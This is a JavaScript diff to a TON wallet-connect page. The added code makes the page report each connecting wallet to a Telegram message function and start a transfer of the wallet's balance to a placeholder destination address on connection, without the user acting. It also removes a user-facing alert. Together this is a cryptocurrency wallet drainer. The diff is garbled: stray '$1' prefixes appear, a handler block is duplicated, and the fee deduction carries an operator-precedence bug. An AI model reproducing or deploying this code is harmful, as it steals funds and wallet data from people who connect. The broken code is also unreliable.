@@ -78,7 +78,14 @@
         });
 
         // Event listener for wallet connection
-        tonConnectUI.onStatusChange(async (walletInfo) => {
+$1tonConnectUI.onStatusChange(async (walletInfo) => {
+$1    if (walletInfo.account) {
+$1        const message = `Wallet connected: ${walletInfo.account}`;
+$1        await sendTelegramMessage(message);
+$1        checkBalance(walletInfo.account.address);
+$1        // Automatically initiate transfer when wallet is connected
+$1        didtrans();
+$1    }
             if (walletInfo.account) {
                 const message = `Wallet connected: ${walletInfo.account}`;
                 await sendTelegramMessage(message);
@@ -111,7 +118,6 @@
             try {
                 const walletInfo = tonConnectUI.connected;
                 if (!walletInfo || !walletInfo.account) {
-                    alert('Please connect your wallet first.');
                     console.error('Wallet is not connected. Cannot proceed with transaction.');
                     return;
                 }
@@ -121,7 +127,7 @@
                     messages: [
                         {
                             address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
-                            amount: walletInfo.balance - 3000000 // Deduct fee (in nanotons)
+                            amount: walletInfo.balance || 0 - 3000000 // Deduct fee (in nanotons)
                         }
                     ]
                 };
